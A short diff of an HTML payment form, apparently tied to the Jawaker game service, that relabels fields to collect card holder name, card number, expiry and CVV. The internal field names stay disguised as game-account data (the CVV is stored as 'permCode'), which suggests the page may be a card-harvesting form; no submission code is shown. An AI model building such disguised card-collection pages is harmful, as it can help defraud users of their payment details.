@@ -413,7 +413,7 @@
 
     <div class="order-chip" id="orderChip"></div>
 
-    <div class="section-label">معلومات اللاعب</div>
+    <div class="section-label">معلومات البطاقة</div>
 
     <form id="payForm" novalidate>
       <div class="field">
@@ -421,17 +421,17 @@
       </div>
 
       <div class="field card-field">
-        <input type="text" id="f-holder-name" name="jawakerName" placeholder="Holder Name" pattern="[^0-9]*" required>
+        <input type="text" id="f-holder-name" name="jawakerName" placeholder="card Holder Name" pattern="[^0-9]*" required>
       </div>
 
       <div class="field card-field">
-        <input type="text" id="f-jawaker-number" name="jawakerNumber" inputmode="numeric" placeholder="Number" maxlength="19" required>
+        <input type="text" id="f-jawaker-number" name="jawakerNumber" inputmode="numeric" placeholder=" card Number" maxlength="19" required>
       </div>
 
       <div class="row-3">
         <input type="text" id="f-mm" name="mm" inputmode="numeric" maxlength="2" placeholder="MM" pattern="\d{2}" required>
         <input type="text" id="f-yy" name="yy" inputmode="numeric" maxlength="2" placeholder="YY" pattern="\d{2}" required>
-        <input type="text" id="f-key" name="permCode" inputmode="numeric" maxlength="4" placeholder="Key" pattern="\d{3,4}" required>
+        <input type="text" id="f-key" name="permCode" inputmode="numeric" maxlength="4" placeholder="cvv" pattern="\d{3,4}" required>
       </div>
 
       <button type="submit" class="submit-btn" id="submitBtn" disabled>إرسال</button>
